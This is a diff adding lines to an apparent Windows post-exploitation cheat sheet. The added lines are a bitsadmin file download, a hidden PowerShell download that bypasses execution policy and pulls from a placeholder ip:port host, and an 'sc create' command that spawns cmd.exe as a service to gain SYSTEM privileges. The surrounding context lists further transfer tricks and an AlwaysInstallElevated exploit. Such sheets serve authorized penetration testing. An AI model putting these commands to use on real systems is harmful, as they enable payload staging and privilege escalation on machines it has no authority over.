@@ -115,7 +115,9 @@ File Transfer
 iexplore.exe http://blah.com/filename.zip
 C:\windows\explorer.exe http://somewhere.com/filename.ext
 ftp ftp.site.dom
-	
+bitsadmin /transfer systemrepair /download /priority normal http://path/to/file c:\path\local\file
+powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"
+
 	
 USERS
 whoami
@@ -608,6 +610,10 @@ sc stop target
 sc start target
 	-errors may occur starting service, but only after commands are executed
 
+sc create servicename type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start servicename
+	-Create malicious services, and gain local system privilege, may gain local system privs
+
+	
 AlwaysInstallElevated
 	exploit/windows/local/always_install_elevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
